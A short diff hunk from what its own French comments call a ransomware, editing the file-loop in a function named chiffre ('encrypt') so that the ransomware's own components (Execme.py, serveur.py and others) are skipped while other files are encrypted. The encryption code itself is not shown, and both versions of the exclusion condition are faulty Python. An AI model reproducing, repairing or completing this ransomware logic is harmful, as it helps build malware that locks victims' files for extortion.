@@ -90,7 +90,7 @@ def chiffre():
 	#ouverture des fichiers
 	for file in files:
 		#on ajoute des exceptions pour pas que les composants du ransomware soient chiffrés.
-		if file != ("/tmp/Execme.py" or "/tmp/serveur.py" or "/tmp/requirement.txt" or "/tmp/README.md"):
+		if "Execme.py" or "serveur.py" or "requirement.txt" or "README.md" in file :
 
 			try:
 
